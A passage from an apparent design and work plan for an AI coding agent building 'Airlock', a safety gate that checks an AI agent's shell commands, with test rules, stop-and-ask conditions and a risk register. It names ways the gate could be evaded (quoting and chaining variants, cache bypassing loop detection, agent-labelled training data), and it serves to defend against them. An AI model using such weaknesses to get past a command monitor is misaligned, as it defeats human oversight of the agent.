- **C3 scripts:** `npm|pnpm|yarn run <script>` → `<script>` is in `package.json` `"scripts"` (**not** the lockfile). Optional: `make <target>` against the Makefile. Suggest the closest names.
- **C4 installs:** `pip|npm|cargo … install <pkg>` where `<pkg>` is not in the project manifest → ASK with a note including nearest installed-dependency name if the edit distance is small (typosquat / hallucinated-name guard). No network calls (I9).
- All checks are individually switchable in config. Start every check in shadow mode.

### 9.5 Learned permits (L3.5) — only if Phase 3.2 approves
`ApprovalTemplate`: `binary`, `subcommand`, `allowed_flags`, `typed_args`, `workspace_id`, `created_at`, `originating_audit_id`, `ttl_days=7`, `max_blast=…` (non-default fields first). Typed-arg types **must exclude** the workspace root, `.git`, home, and system paths. Blast cap derives from a deterministic command-class table. Never for network egress or writes outside the workspace. Trust-root invalidation applies. L1 re-run on every hit; log `auto-approved via template <id>` with the originating decision.

### 9.6 Config keys (illustrative — **verify against the existing config schema before adding**)
```yaml
airlock:
  grounding: { enabled: true, mode: shadow, checks: { binary: true, files: true, scripts: true, installs: true } }
  cache: { enabled: true, ttl_seconds: 3600, max_entries: 2048, trust_root_files: [package.json, Makefile, ...] }
  ml: { backend: auto, onnx_int8: { enabled: false } }   # enabled only after the 1.5 gates
  embedder: { enabled: false, model: "<verified id>", dimensions: <verified>, device: auto }
  experiment_frozen_heads: { enabled: false, log_only: true }
  sequence_analysis: { mode: shadow }
```

---

## 10. Testing & Verification Standards

- **Regression first:** the existing suite (126 tests as of v1 README; re-count in Phase 0A) must pass after every task.
- **New tests per component** (suggested names; adapt to actual layout): `test_eval_harness.py`, `test_replay.py`, `test_audit_schema_ext.py`, `test_rule_suggester.py`, `test_decision_cache.py`, `test_cache_breaker_order.py`, `test_trust_root_invalidation.py`, `test_grounding_checks.py`, `test_onnx_parity.py`, `test_scrubber.py`, `test_dataset_validation.py`; Phase 2: `test_similarity_engine.py`, `test_embedder_fallback.py`, `test_semantic_circuit_breaker.py`, `test_shadow_sequence.py`; Phase 3 (if built): `test_approval_templates.py`.
- **Invariant tests are mandatory:** I2 (L2.5 can never ALLOW/DENY), I3 (learned permit never overrides a current deny), I7 (fallbacks), I1 (errors → ASK), R1 (breaker before cache).
- Tests must be hermetic: temp dirs, injected config/audit/socket paths, no network, no real daemon state, no real user config.
- Evasion property tests: for each new parser/normalizer path, include quote/caret/backtick/chaining/line-continuation variants.
- Evaluate on both PyTorch FP32 and ONNX INT8 paths where both exist.

---

## 11. Working Rules

- **Small units:** one logical change per commit; keep diffs reviewable. Prefer targeted edits over rewriting whole files.
- **Commit messages:** `type(scope): summary` (e.g., `feat(cache): exact-key decision cache`), body references ADR/fact/metric ids. No force pushes; never push to `main`.
- **Definition of Done (per task):** acceptance criteria met → tests pass (output seen) → docs updated (`progress`, `decisions`, `verified-facts`, `metrics`, `architecture` as relevant) → committed.
- **Context hygiene:** if your context grows long or you start to lose track, stop, write the handoff in `progress.md`, and end the session cleanly.
- **Dependency discipline:** pin versions you tested; add to optional extras where possible; record versions in `verified-facts.md`.
- **Performance claims:** measure warm and cold, report p50/p95/p99, state hardware, repeat ≥ 3 runs.
- **Security findings:** if you discover a bypass or vulnerability in v1, report it to Ani in `progress.md` immediately and **do not** write exploit details into public docs or commit messages.

---

## 12. Stop-and-Ask Conditions

Write the item to `progress.md → Blockers & Questions for Ani` and stop work on the affected task if:

1. You are about to change a default hard-allow/hard-deny rule or any of D1–D5.
2. A gate criterion is not met, or a gate would require a number you cannot measure.
3. Eval/training labels need human review before gating.
4. A premise this plan depends on turns out false (e.g., deny reasons don't reach the model; embedder doesn't exist as described; export impossible).
5. A model/dependency download over ~200 MB, or a new heavy dependency, is required.
6. Anything would touch the user's real `~/.gemini/antigravity-cli` config/audit log (beyond a read-only copy for mining).
7. A test fails and you cannot resolve it in 3 attempts without weakening it.
8. You find a security issue in v1.
9. The Airlock blocks one of your own commands and you can't proceed without bypassing it.

---

## 13. Risk Register (keep current in `progress.md`)

| Risk | Mitigation |
|------|-----------|
| Embedding similarity mistaken for semantic equivalence | I2; ASK-only L2.5; near-miss evals |
| Cache bypasses loop detection | R1 ordering + dedicated test |
| Allow-rules over repo-controlled code enable escalation | Trust-root invalidation; suggester warnings |
| L0 false denies raise friction | Shadow first; replay of historical successes; per-check switches |
| Quantization shifts calibration | Parity gate incl. confidence/ECE; threshold re-validation |
| Tiny eval set gives false confidence | Report upper bounds; reach ≥ 300 dangerous; human-reviewed labels |
| Label circularity (agent labels its own data) | I4; `review_status`; Ani reviews |
| Audit-log data leaks secrets into repo | Scrubber + tests; never commit raw logs |
| Heavy dependencies bloat install | Optional extra; lazy load; numpy over FAISS |
| Windows/POSIX divergence | I10; per-OS tests for builtins/paths |
| Scope creep (security features vs. the four goals) | Sequence analysis shadow-only; every feature maps to G-A…G-D |

---

## 14. Your First Message (what to do right now)

1. Confirm you have read this document in full and list, in your own words, the **ten invariants and the four goals** (one line each) — to prove you internalized them.
2. Begin **Phase 0A**. Do not write feature code.
3. When 0A is complete, post a short report: repo reality vs Section 6 discrepancies, baseline test result, environment, the `docs/v2/` files created, and the first three `UNVERIFIED` items you intend to verify. Then wait for Ani.

---

## Appendix A — Known Unknowns to Verify (seed `verified-facts.md` with these as UNVERIFIED)

1. Exact model id, size, license, MRL dimensions, dtype requirements, and prompt format of the intended embedder; whether "EmbeddingGemma 2" exists.
2. Whether the Antigravity `PreToolUse` deny `reason` reaches the model's context.
3. How (or whether) human approval of an ASKed command is observable to the hooks.
4. Whether the fine-tuned ModernBERT/`laya` model exports to ONNX with all three heads; INT8 speedup on the dev CPU; whether a GPU speedup exists at all.
5. Real v1 numbers: CPU/GPU latency, load time, RAM, startup-to-ready on the dev machine.
6. Actual repo layout, config schema, audit schema, and hook payload fields (cwd, workspace root).
7. Whether the hook payload includes the caller's environment/PATH/cwd (needed for L0 correctness).
8. Whether `PostToolUse` can modify or truncate tool output (a possible token saver; investigate only after Phase 1, record as an opportunity, do not build without approval).
9. Real size and composition of the user's `audit.jsonl` (enough traces for replay?).
10. Test-suite behavior on other OSes (CI status, if any).

## Appendix B — Glossary

- **Near-miss pair:** two commands that look alike but differ in safety (the core eval structure).
- **Trust-root file:** a repo file whose contents change what an otherwise-"safe" command executes.
- **Shadow mode:** a feature runs and logs what it *would* do, but takes no action.
- **Replay:** running recorded sessions through the pipeline with a simulated approver to measure stateful behavior.
- **Gate (G0–G3):** a checkpoint with explicit criteria; the next phase does not begin until the owner approves.
- **ADR:** architecture decision record in `docs/v2/decisions.md`.
